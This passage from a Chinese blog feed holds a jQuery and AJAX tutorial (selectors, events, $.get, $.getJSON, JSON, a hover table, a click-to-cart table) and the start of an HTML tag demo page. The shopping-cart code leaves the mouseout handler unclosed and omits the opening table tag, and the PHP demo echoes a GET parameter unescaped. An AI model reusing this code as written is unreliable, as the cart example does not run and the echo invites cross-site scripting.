</code></pre><p>当鼠标点击输入框时“请填写用户名”这几个字消失掉。这就是focus事件，它表示某个控件获得焦点。看看代码，用到了一个选择器$(“:text”)，它表示所有type=text的input元素。当该元素获得焦点后，执行了val方法。这个方法就是改变input标签的value属性，也就是改变显示在文本框内的内容。</p>
<p><strong>选择器详解和css语法</strong></p>
<p>上面只提到了一个id选择器，选择id=xxx的某元素。其实Jquery的选择器可谓多种多样，对css比较熟悉的同学就很好学了，因为css的语法Jquery选择器基本都能用。</p>
<p>比如，css里面，定义一个类的样式的方法：.XXX{}，而在Jquery里选择一个class=XXX的元素的方法：$(“.XXX”)。</p>
<p>举一些常用的例子，详细的选择器说明在w3school里都有列出。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery2.png" alt=""></p>
<p>这只是我举的一些例子，基本上选择器Jquery和css类似，所以对css比较熟悉的人可以很快掌握Jquery的选择器语法，这也是Jquery流行的原因之一，很好学习，一通百通。</p>
<p><strong>事件详解</strong></p>
<p>在很多Jquery代码中，我们总是能看到是这样的形式：</p>
<pre><code>$(document).ready(function(){
    //Jquery代码
});
</code></pre><p>所有的代码被套在了最外层的ready中。我上次也提到了，ready是一个事件。我们上面说的选择器，它选择某元素的作用，其实就是为了完成后面的工作。看我们这个代码，$(document)选择的是document对象，这个对象学javascript应该很清楚，指的就是整个html文档。选在选在到了对象，这个对象有一个方法ready();</p>
<p>ready是一个事件。事件是什么概念，和很多编程一样，事件是由用户在执行相应的操作后自动触发的一个过程，我们可以给某事件绑定一个处理函数，当用户触发了这个事件后，就能执行我们绑定的函数。</p>
<p>ready()是一个事件绑定函数，它中间那个function(){}就是我们为ready事件绑定的函数。ready事件在对象加载完成后触发，我们前面选择的是document对象，所以这个ready就是指整个文档加载完成后触发的事件。</p>
<p>所以整段代码意思就是为document对象的ready事件添加响应函数function(){}，这个函数里面添加我们希望Jquery做的事情。当文档加载完成后，执行此函数，相当于执行我们的代码。</p>
<p>我列举一些Jquery中常用的事件及其绑定函数：</p>
<pre><code>click 鼠标点击事件 （最常用，当鼠标点击某对象时触发此函数）

change 对象被改变（如input框中写入、修改、删除文字时触发此事件）

focus 对象获得焦点（如光标进入textarea框触发此事件）

blur 对象失去焦点（与focus事件相对）

load 对象加载完成（如图像被加载完成时触发此事件）

error 对象遇到错误 （如图像输入了一个错误的地址，没有成功加载）

mousemove 鼠标移动 （当鼠标移动时触发此事件）
</code></pre><p>试试mousemove事件，运行这段代码：</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function(){
$(document).mousemove(function(e){
$(&quot;span&quot;).text(e.pageX + &quot;, &quot; + e.pageY);
});
});
&lt;/script&gt;
&lt;/head&gt;    
&lt;body&gt;
&lt;p&gt;鼠标位于坐标： &lt;span&gt;&lt;/span&gt;.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>可以看到，鼠标移动后就能输出当前鼠标所在的坐标。其中function有一个参数e，每个事件函数都有一个参数，这个参数就是指该事件本身。（当然这个参数可以省略），e.pageX和e.pageY就是指鼠标以后后鼠标所在的位置。</p>
<p><strong>html操作详解</strong></p>
<p>选择器的作用我说了，就是完成为了后面的操作。除了为选择到的对象添加一个事件响应函数外，还能直接操作此对象，这就是我们的html操作。</p>
<p>我也列举一些常用的html操作方法（更详细地在w3school中查看）</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery3.png" alt=""></p>
<p>通过这些方法，我们能动态地对html页面进行操作。再结合ajax，就可以动态地向服务器请求内容，并在不刷新页面的情况下更新页面中一部分。</p>
<p><strong>什么是ajax</strong></p>
<p>ajax指异步javascript。相信很多同学在百度百科里也看到了它的相关介绍，不过说的挺复杂，各种各样的专业术语。如果只是基础，我们这样理解ajax好了：利用ajax可以动态地以javascript的方式向服务器请求数据，并接受服务器发回的数据，这个过程浏览器可以做其他的任何工作，可以不离开页面，不刷新。</p>
<p>具体来说呢？我举个小例子，现在有一个注册表单，要用户填写用户名。一般都会有一个“检查是否已被占用”链接，用户点击链接后，浏览器打开一个新页面，向服务器发送一个请求，在数据库里咨询看用户名是否已存在，得到结果后返回到页面里提示用户。如果不用ajax，大家可以想象，点击了链接，浏览器势必要打开新页面，给用户带来不便。但是运用ajax，用户点击链接后，不打开新页面，而由javascript在后台向服务器获取结果，然后用一个提示框弹出提示用户，用户在这个过程中还可以继续填写表单，两个过程互不影响。页面不会跳转，也不会刷新，用户之前填写的内容不会丢失。</p>
<p>这就是所谓的异步，类似于多线程。</p>
<p>甚至我们做一个网站，放上背景音乐，网站中一切链接都由ajax完成（比如点击了一片文章，ajax向服务器请求文章内容，然后用我上次说的Jquery html操作将网页中的一部分进行修改，这样文章就放入了页面而并不刷新页面），这样我们的音乐就一直不会被刷新。</p>
<p>所以说ajax最大的优点，就是在不更新整个页面的情况下对部分内容进行修改、维护，这样服务器发送的数据少，减少了服务器的负担。</p>
<p><strong>简单的ajax获取信息</strong></p>
<p>来看看我们用Jquery怎么去结合ajax。</p>
<p>首先看看怎么获取服务器上一个txt文件：使用load()方法</p>
<p> (因为ajax使用同源策略，所以在哪个网站运行代码就只能请求该服务器上的内容，我请求的是w3school中的一个txt文件，大家把代码放在<code>http://www.w3school.com.cn/tiy/t.asp?f=html_basic</code>运行才能看到效果)</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;
&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
$(&quot;#btn1&quot;).click(function(){
    $(&apos;#test&apos;).load(&apos;http://www.w3school.com.cn/example/jquery/demo_test.txt&apos;);
    })
})
&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;h3 id=&quot;test&quot;&gt;请点击下面的按钮，通过 jQuery AJAX 改变这段文本。&lt;/h3&gt;
&lt;button id=&quot;btn1&quot; type=&quot;button&quot;&gt;获得外部的内容&lt;/button&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>大家可以看到，点击按钮后文本被改变。这其中我请求的就是<code>http://www.w3school.com.cn/example/jquery/demo_test.txt</code>文件。看到Jquery代码，它为按钮绑定了click事件，点击按钮后，执行$(‘#test’).load(‘<a href="http://www.w3school.com.cn/example/jquery/demo_test.txt" target="_blank" rel="external">http://www.w3school.com.cn/example/jquery/demo_test.txt</a>‘); 也就是请求这个文本文件内容，并将id=test的元素内容改变成请求到的文本。</p>
<p>这是最简单的ajax，简单地请求一个文本文件。最常见的，我们是向一个脚本，通过get或post请求一个html或json。</p>
<p><strong>ajax使用get请求向服务器请求html内容</strong></p>
<p>又回到我们开始的那个例子，判断用户名是否存在。</p>
<p>比如我们服务器上有这样一个文件nameexists.php:</p>
<pre><code>&lt;?php
$name = $_GET[&apos;act&apos;];
/*
*
*在数据库中咨询用户名是否存在
*
*/
$re = true; //假设用户名存在
if($re){
    echo &quot;用户名 $name 已存在&quot;;
}else{
    echo &quot;恭喜您，该用户名可以使用&quot;;
}
?&gt;
</code></pre><p>然后我们浏览器表单如下：</p>
<pre><code>&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function sub(){
    var name = $(&quot;#name&quot;).val();
    $.get(&quot;nameexists.php&quot;, {
        &quot;act&quot;: name
    }, function(data, status){
        if (status) {alert(data);}
    });
}
&lt;/script&gt;
&lt;form&gt;
    &lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt;
    &lt;input type=&quot;button&quot; value=&quot;验证&quot; onclick=&quot;sub();&quot;/&gt;
&lt;/form&gt;
</code></pre><p>大家试验即可看到，当点击“验证”后，弹出提示框</p>
<p>并没有刷新页面，我们填写的内容依旧在表单中。这就是向服务器请求了html，返回的“用户名…已存在”就是一个html文本，最后体现在用户面前。</p>
<p>我们看Jquery代码。这是一个javascript函数，当点击按钮时执行此函数。首先选择器选择了id=name的文本框，用val()方法获取其值，并赋值给name变量。</p>
<p>看后面，用到了get方法。这个方法是一个全局的方法，所以写成$.get，这个方法有三个参数：$.get(url, data, callback);</p>
<p>url是我们要请求的地址，data是我们要传递的参数，写成{‘索引1’:’参数2’,’索引2’:’参数2’…}的形式，也可以把他们直接写在url后面: url?a=1&amp;b=2… （只适用于get请求）。第三个参数callback是一个回调函数，这个函数在获取到数据后运行，也就是说收到的数据可以在这个函数中处理。函数原型：function(data,status,xhr)</p>
<p>data是获得的返回数据，status是状态（成功或失败），xhr是XMLHttpRequest对象（我这里用不上）。</p>
<p>所以大家可以看到，我直接把获得的返回数据data弹出来：alert(data)。而我们看到php，其实这个data就是echo输出的内容。</p>
<p>类似于get方式，post()方法参数都与get相同，我就不举例子了。这是获取的html内容，其实在javascript中，更多的是获取json，再通过javascript代码处理json来显示给我们用户看。</p>
<p><strong>什么是json</strong></p>
<p>又到了普及概念的时候。json是一种javascript原生的数据交换格式。</p>
<p>在互联网上，最普遍的就是数据交换。比如在QQ上，A向B发送一个数字，一个字母或一句话，来告诉B某些信息。但是数字、字符串很好传递，有些对象却并不那么容易传递，比如数组。我们怎么把一个数组对象通过QQ发送给别人？</p>
<p>有些人就说，这很简单啊，在php里，不就是“array(1=&gt;’a’,2=&gt;’b’,3=&gt;’C’);”我就把这个字符串给B发送过去，B一看就知道数组是怎么构成的了。对，其实这就是一种数据交换格式，不过这仅仅是php里定义数组的语法，如果B不懂php，他也许就看不懂你给他发送是这个是什么意思。</p>
<p>所以就诞生了json和xml两种通用的数据交换格式。我不说xml也不比较二者，只来说说json。因为json是从javascript发展出来的，所以十分适合javascript。比如刚才的数组，用json写出来：</p>
<pre><code>{
    &quot;1&quot;: &quot;a&quot;,
    &quot;2&quot;: &quot;b&quot;,
    &quot;3&quot;: &quot;C&quot;
}
</code></pre><p>这样的json能在任何javascript中被解析成一个json对象，我们可以通过json.xxx来得到相应内容。</p>
<p><strong>ajax的json方法</strong></p>
<p>Jquery中从服务器加载json数据的方法是：$.getJSON</p>
<p>它的参数与get()方法完全一样，但是服务器返回结果data应该是一个json格式的字符串（如果不是就出错）。</p>
<p>我说了json是一个通用的数据交换编码，所以在php里也有方法把对象处理成json字符串。在php5.2以上的版本，有了一对函数json_encode()和json_decode()，分别对php中对象进行json格式的编码和解码。</p>
<p>举个没什么营养的例子。</p>
<p>服务端：</p>
<pre><code>&lt;?php
$arr = array(&apos;name&apos;=&gt;&apos;name&apos;, &apos;url&apos;=&gt;&quot;url&quot;, &apos;PR&apos;=&gt;0);
echo json_encode($arr);
?&gt;
</code></pre><p>浏览器：</p>
<pre><code>&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function sub(){
    $.getJSON(&quot;test2.php&quot;, function(data, status){
        if (status){
            $(&quot;div&quot;).html(data.name + &apos; | &apos; + data.url + &apos; | &apos; + data.PR);
        }
    });
}
&lt;/script&gt;
&lt;form&gt;
    &lt;div&gt;&lt;/div&gt;
    &lt;input type=&quot;button&quot; value=&quot;提交&quot; onclick=&quot;sub();&quot;/&gt;
&lt;/form&gt;
</code></pre><p>大家可以试验，点击了按钮后，打印出了php中定义的数组内容。php端两行代码，定义了一个数组，并用json_encode把数组做成一个json编码的字符串输出。</p>
<p>再看Jquery代码，大家会发现，实际上获得的内容是一个对象，我们用点号访问对象中内容：data.name, data.url, data.PR.</p>
<p>这只是json的简单事例，没什么实用性。大家可以试想，假如图书馆有个图书检索系统，用户向服务器请求书名，服务器查询数据库后把所有符合条件图书信息做成一个二维数组，再用json形式发送给浏览器，Jquery把他们美化后输出，过程并不复杂。</p>
<p><strong>一个鼠标移动上去就变换颜色的表格</strong></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;表格1&lt;/title&gt;
&lt;style&gt;
table.hovertable {
    font-size:13px;
    color:#333333;
    border-width: 1px;
    border-color: #999999;
    border-collapse: collapse;
    width: 100%;
}
table.hovertable th {
    background-color:#c3dde0;
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
    text-align: left;
}
table.hovertable tr {
    background-color:#d4e3e5;
}
table.hovertable td {
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
}
&lt;/style&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
    $(&quot;.hovertable td&quot;).mouseover(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;
    });
    $(&quot;.hovertable td&quot;).mouseout(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;;
    });
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;table class=&quot;hovertable&quot;&gt;
&lt;tr&gt;&lt;th&gt;标题&lt;/th&gt;&lt;th&gt;内容&lt;/th&gt;&lt;th&gt;时间&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;aaa&lt;/td&gt;&lt;td&gt;15:30&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;bbb&lt;/td&gt;&lt;td&gt;17:40&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;ccc&lt;/td&gt;&lt;td&gt;13:35&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;ddd&lt;/td&gt;&lt;td&gt;08:53&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>大家依旧是放到<code>http://www.w3school.com.cn/tiy/t.asp?f=jquery_hide</code> 运行，可以看到，当鼠标移动到相应的行上的时候，该行变色，当鼠标移走时，颜色恢复。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery4.png" alt=""></p>
<p>这个效果相信大家在很多地方见到过，我这里运用了Jquery和HTML DOM两种方法结合。这就是我要说的一个重点。</p>
<p>我们看Jquery代码：<code>$(&quot;.hovertable td&quot;).mouseover</code>，选择了class=hovertable的元素的td子元素，为他的mouseover事件绑定一个函数。td元素就是表格中的一个格子，mouseover事件指“鼠标移动到上面”。也就是说，当用户鼠标移动到每个格子上，都会触发这个事件，进而执行函数中的代码。</p>
<p>看到这个函数中的代码，<code>event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;</code></p>
<p>event是什么？我们可以看到，function(event)，所以event是这个事件绑定函数的一个参数，它指的就是“鼠标掠过”事件对象。</p>
<p>为什么要用这个event？因为我们可以看到，鼠标移动到某一行上，只有这一行的颜色会发生变化，我们必须知道鼠标移动到哪一行上了，所以必须获得这个event对象。</p>
<p>event对象有如下一些方法或属性：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery6.png" alt=""></p>
<p>大家可以看到，我用到的就是target属性，event.target指的就是触发mouseover事件的DOM元素，在这里就是td。</p>
<p>所以在函数中，我们得到了鼠标所在的元素。在这里，我来说一下我们获得的这个DOM对象。</p>
<p>在Jquery中，有对html操作的一些函数，比如<code>$(xx).html()</code>，获取某元素内的内容。而在单纯的javascript中，也有对html操作的DOM函数，比如xx.innerHTML，它也是获取某元素中的内容。而在实际运用中，这两种函数是不能互相使用的。比如我们一个Jquery对象：$(“div#test”)，它不能用<code>$(&quot;div#test&quot;).innerHTML</code>来获取内容，只能用<code>$(&quot;div#test&quot;).html()</code>来获取。</p>
<p>同样的，对于DOM对象event.target，也是不能使用Jquery的方法的。比如，有的同学直接使用<code>event.target.css(&#39;background-color&#39;,&#39;red&#39;)</code>，想这样更改它的背景颜色。这样浏览器是会报错的，错误是td对象不含有css方法。</p>
<p>所以大家可以看到，我使用的是DOM中的方法<code>event.target.parentNode.style.backgroundColor</code>，首先用parentNode获得td元素的父元素tr元素（因为我是要一行都改变颜色，而不是只让鼠标所在的格子改变颜色），再用style属性，改变tr元素的样式。这里说一下，style下面有很多属性，比如这里的backgroundColor是指css中的<code>&#39;background-color&#39;</code>，一般都是css中的名字，其中第二个单词首字母变成大写。</p>
<p>所以这句话也就是改变了tr的样式，将css中的background-color改成#F0FFFF。</p>
<p>第二个函数也一样，mouseout方法是指“鼠标离开”，如果鼠标移开，就把颜色改回以前的颜色。这样就完成了我们这个“变色表格”的制作。</p>
<p><strong> 一个选择商品系统</strong></p>
<p>我们继续来强化刚才制作的这个表格。</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;表格1&lt;/title&gt;
&lt;style&gt;
table.hovertable {
    font-size:13px;
    color:#333333;
    border-width: 1px;
    border-color: #999999;
    border-collapse: collapse;
    width: 100%;
}
table.hovertable th {
    background-color:#c3dde0;
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
    text-align: left;
}
table.hovertable tr {
    background-color:#d4e3e5;
}
table.hovertable td {
    border-width: 1px;
    padding: 8px;
    border-style: solid;
    border-color: #a9c6c9;
}
&lt;/style&gt;
&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
    $(&quot;.hovertable td&quot;).mouseover(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;;
    });
    $(&quot;.hovertable td&quot;).mouseout(function(event){
        event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;;
    $(&quot;.hovertable td&quot;).click(function(event){
        var name = $(event.target.parentNode).children(&quot;td:first&quot;).html();
        var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();
        $(event.target.parentNode).remove();
        $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;);

    });
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;tr&gt;&lt;th width=&quot;40%&quot;&gt;商品&lt;/th&gt;&lt;th width=&quot;40%&quot;&gt;类别&lt;/th&gt;&lt;th&gt;价格&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;肥皂&lt;/td&gt;&lt;td&gt;日用品&lt;/td&gt;&lt;td&gt;5.5&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;拖把&lt;/td&gt;&lt;td&gt;清洁用品&lt;/td&gt;&lt;td&gt;25.0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;硬盘&lt;/td&gt;&lt;td&gt;电子产品&lt;/td&gt;&lt;td&gt;450.0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;酸奶&lt;/td&gt;&lt;td&gt;奶制品&lt;/td&gt;&lt;td&gt;9.9&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;苹果&lt;/td&gt;&lt;td&gt;水果&lt;/td&gt;&lt;td&gt;2.5&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;div id=&quot;buy&quot; style=&quot;border: 1px solid #999;margin-top: 10px;text-align: center;&quot;&gt;
    &lt;h4 style=&quot;color: red;&quot;&gt;购物车&lt;/h4&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>大家运行后可以看到，这次我做了一个类似网上购物时选购商品的页面：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/jquery5.png" alt=""></p>
<p>每点击一个商品，我们就把这一行从表格中删除，并加到下方的“购物车”框中。其实改动并不大，表格还是刚才的表格，Jquery中增加了一个函数：</p>
<pre><code>$(&quot;.hovertable td&quot;).click(function(event){
    var name = $(event.target.parentNode).children(&quot;td:first&quot;).html();
    var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();
    $(event.target.parentNode).remove();
    $(&quot;#buy&quot;).append(&apos;&lt;p&gt;&apos; + name + &quot;/&quot; + price + &apos;元&lt;/p&gt;&apos;);
});
</code></pre><p>就是一个当某个格子被点击时，执行的代码。看第一行，我们会发现，event.target.parentNode我认识，但为什么要把它放在$()中间？</p>
<p>这就涉及到DOM对象转换成Jquery对象的过程。大家用Jquery多了就会喜欢Jquery的简洁，但DOM对象并不能使用Jquery的方法，所以Jquery其实给了大家一个方式，能把DOM对象转换成Jquery对象，也就是把DOM对象直接放到$()中即可。</p>
<p>比如我们一般写的<code>$(document).ready，</code>其实就是把DOM对象document转换成了Jquery对象，使用Jquery的方法ready。</p>
<p>这里也一样，把<code>event.target.parentNode</code>转换成了Jquery的对象。后面一个children其实是Jquery下我没讲到的“遍历函数”。遍历函数其实就是遍历某个对象，比如我们一个table对象，要取其中每行的内容，就可以用each方法遍历。</p>
<p>children方法用的也很多，意思是取满足条件的某子元素。大家可以看到，children(“td:first”)，就是取第一个td元素。也就是这一行的第一个格子，再用html()取到其内容，保存到变量name里。</p>
<p><code>var price = $(event.target.parentNode).children(&quot;td:last&quot;).html();</code>也是一个道理，取最后一个格子内容。</p>
<p>于是这里就得到了我点击的这一行的商品名和价格。然后用$(event.target.parentNode).remove();把这一行移除，再用append把内容加到“购物车”里。就制成了这个简单的选购商品的页面。</p>
<p>本文内容转自：<a href="https://www.leavesongs.com/" target="_blank" rel="external">离别歌</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 编程 </tag>
            
            <tag> JQuery </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML学习笔记]]></title>
      <url>/2016/08/26/HTML%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>超文本标记语言，标准通用标记语言下的一个应用。<br>“超文本”就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。<br>超文本标记语言的结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。<br><a id="more"></a></p>
<p><head></head></p>
<p><meta charset="utf-8"></p>
<p><title>HTML学习笔记</title></p>
<p><meta name="keywords" content="前端开发,Web标准"></p>
<p><meta name="description" content="编写HTML时常用到的标签在浏览器下的默认效果。"></p>
<p><meta name="viewport" content="width=device-width,initial-scale=1.0"><br></p>
<p></p><h1>HTML 常用标签演示</h1><p></p>
<p>本页演示的所有标签均为浏览器默认效果。</p><br><h2>【基础】</h2><br><p><strong>&lt;div&gt;</strong> 定义文档中的节<small>（块元素，无任何属性）</small></p><br><p><strong>&lt;span&gt;</strong> <span>定义文档中的节</span><small>（内联元素，无任何属性）</small></p><br><hr><br><p><strong>&lt;h1&gt;</strong> to <strong>&lt;h6&gt;</strong> 定义标题<small>（通常使用粗体显示。注意：单个页面内最好只使用1个H1标签）</small></p><br><h1>H1 标题</h1><br><h2>H2 标题</h2><br><h3>H3 标题</h3><br><h4>H4 标题</h4><br><h5>H5 标题</h5><br><h6>H6 标题</h6><br><hr><br><p><strong>&lt;p&gt;</strong> 定义段落</p><br><hr><br><p><strong>&lt;hr&gt;</strong> 定义水平线<small>（本页中的分割线均为 &lt;hr&gt; 标签）</small></p><br><hr><br><p><strong>&lt;header&gt;</strong> 定义 section 或页面的头部</p><br><p><strong>&lt;footer&gt;</strong> 定义 section 或页面的尾部</p><br><p><strong>&lt;article&gt;</strong> 定义文章</p><br><p><strong>&lt;section&gt;</strong> 定义文档中的节</p><br><p><strong>&lt;aside&gt;</strong> 定义文档内容相关的内容</p><br><p><strong>&lt;nav&gt;</strong> 定义导航</p><br><header>header 头部</header><br><footer>footer 尾部</footer><br><article>article 内容</article><br><section>section 内容</section><br><aside>aside 内容</aside><br><nav>nav 内容</nav><br><hr><br><p><strong>&lt;details&gt;</strong> 定义细节内容</p><br><p><strong>&lt;summary&gt;</strong> 定义 details 的标题</p><br><details><br><p>All pages and graphics on this web site are the property of W3School.</p><br></details><br><details><br><summary>HTML 5</summary><br>This document teaches you everything you have to learn about HTML 5.<br></details><br><hr><br><h2>【列表】</h2><br><p><strong>&lt;ul&gt;</strong> 定义无序列表<small>（通常列表前会有项目符号）</small></p><br><ul><br>  <li><strong>&lt;li&gt;</strong> 定义列表的项目</li><br>  <li>张三</li><br>  <li>李四</li><br></ul><br><hr><br><p><strong>&lt;ol&gt;</strong> 定义有序列表。<small>（通常列表前会有数字符号）</small></p><br><ol><br>  <li><strong>&lt;li&gt;</strong> 定义列表的项目</li><br>  <li>张三</li><br>  <li>李四</li><br></ol><br><hr><br><p><strong>&lt;dl&gt;</strong> 定义定义列表</p><br><dl><br>  <dt><strong>&lt;dt&gt;</strong> 定义定义列表中的项目</dt><br>  <dd><strong>&lt;dd&gt;</strong> 定义定义列表中项目的描述 </dd><br>  <dt>CF穿越火线</dt><br>  <dd>CF是一个很好玩的游戏啊，一般人玩不了..</dd><br></dl><br><hr><br><h2>【表格】</h2><br><p><strong>&lt;table&gt;</strong> 定义表格</p><br><p><strong>&lt;caption&gt;</strong> 定义表格标题</p><br><p><strong>&lt;thead&gt;</strong> 定义表格中的表头内容</p><br><p><strong>&lt;tfoot&gt;</strong> 定义表格中的表注内容（脚注）</p><br><p><strong>&lt;tbody&gt;</strong> 定义表格中的主体内容</p><br><p><strong>&lt;tr&gt;</strong> 定义表格中的行</p><br><p><strong>&lt;th&gt;</strong> 定义表格中的表头单元格<small>（通常使用粗体显示）</small></p><br><p><strong>&lt;td&gt;</strong> 定义表格中的单元</p>

<p>table 结构标准顺序如下：</p><br><pre><br>&lt;table&gt;<br>  &lt;caption&gt;&lt;/caption&gt;<br>  &lt;thead&gt;<br>    &lt;tr&gt;<br>      &lt;th&gt;&lt;/th&gt;<br>    &lt;/tr&gt;<br>  &lt;/thead&gt;<br>  &lt;tfoot&gt;<br>    &lt;tr&gt;<br>      &lt;td&gt;&lt;/td&gt;<br>    &lt;/tr&gt;<br>  &lt;/tfoot&gt;<br>  &lt;tbody&gt;<br>    &lt;tr&gt;<br>      &lt;td&gt;&lt;/td&gt;<br>    &lt;/tr&gt;<br>  &lt;/tbody&gt;<br>&lt;/table&gt;<br></pre><br><p>※ 虽然 tfoot 放在了 tbody 之前，浏览器依然会将 tfoot 显示在 tbody 之后，而且这样做能让浏览器在获得所有表格内的数据前显示表注。</p>

<p><table><br>  <caption>表格标题</caption><br>  <thead><br>    <tr><br>      <th>表头 ID</th><br>      <th>表头 姓名</th><br>      <th>表头 日期</th><br>    </tr><br>  </thead><br>  <tfoot><br>    <tr><br>      <td>表注 这是编号</td><br>      <td>表注 这是假名</td><br>      <td>表注 这是添加日期</td><br>    </tr><br>  </tfoot><br>  <tbody><br>    <tr><br>      <td>1</td><br>      <td>张三</td><br>      <td>2019-09-09</td><br>    </tr><br>    <tr><br>      <td>2</td><br>      <td>李四</td><br>      <td>2016-6-6</td><br>    </tr><br>  </tbody><br></table></p>
<p><hr></p>
<p><table border="1" cellpadding="1" cellspacing="0"><br>  <caption>自带边框样式</caption><br>  <thead><br>    <tr><br>      <th>表头 ID</th><br>      <th>表头 姓名</th><br>      <th>表头 日期</th><br>    </tr><br>  </thead><br>  <tfoot><br>    <tr><br>      <td>表注 这是编号</td><br>      <td>表注 这是假名</td><br>      <td>表注 这是添加日期</td><br>    </tr><br>  </tfoot><br>  <tbody><br>    <tr><br>      <td>1</td><br>      <td>张三</td><br>      <td>20019-09-09</td><br>    </tr><br>    <tr><br>      <td>2</td><br>      <td>李四</td><br>      <td>2016-6-6</td><br>    </tr><br>  </tbody><br></table></p>
<p><hr></p>
<h2>【表单】</h2>

<p><strong>&lt;form&gt;</strong> 定义表单</p><br><hr><br><p><strong>&lt;fieldset&gt;</strong> 定义围绕表单中元素的边框<small>（通常四周会有缩进，并显示围绕的边框）</small></p><br><p><strong>&lt;legend&gt;</strong> 定义 fieldset 元素的标题</p><br><fieldset><br>  <legend>标题</legend><br>  <p>内容</p><br></fieldset><br><hr><br><p><strong>&lt;select&gt;</strong> 定义选择列表（下拉列表、多选列表）</p><br><p><strong>&lt;optgroup&gt;</strong> 定义选择列表中相关选项的组合</p><br><p><strong>&lt;option&gt;</strong> 定义选择列表中的选项</p><br><select><br>  <optgroup label="张氏"><br>    <option>张三</option><br>    <option>张三的儿子</option><br>    <option>张三的孙女</option><br>  </optgroup><br>  <optgroup label="李氏"><br>    <option>李四</option><br>    <option>李四的女儿</option><br>    <option>李四的孙子</option><br>  </optgroup><br></select><br><hr><br><p>滚动列表形式</p><br><select size="5"><br>  <optgroup label="张氏"><br>    <option>张三</option><br>    <option>张三的儿子</option><br>    <option>张三的孙女</option><br>  </optgroup><br>  <optgroup label="李氏"><br>    <option>李四</option><br>    <option>李四的女儿</option><br>    <option>李四的孙子</option><br>  </optgroup><br></select><br><hr><br><p>多选列表</p><br><select multiple><br>  <optgroup label="张氏"><br>    <option>张三</option><br>    <option>张三的儿子</option><br>    <option>张三的孙女</option><br>  </optgroup><br>  <optgroup label="李氏"><br>    <option>李四</option><br>    <option>李四的女儿</option><br>    <option>李四的孙子</option><br>  </optgroup><br></select><br><hr><br><form id="test_form" action="#test_form"><br><p><strong>&lt;input&gt;</strong> 定义输入控件<small>（如果浏览器不支持 HTML5 新的类型，那么会使用文本域替代）</small></p><br><p>文本域 <code>type=”text”</code> <input name="" type="text"></p><br><p>密码域 <code>type=”password”</code> <input name="" type="password"></p><br><p>复选框 <code>type=”checkbox”</code> <input name="" type="checkbox" value="">A <input name="" type="checkbox" value="">B <input 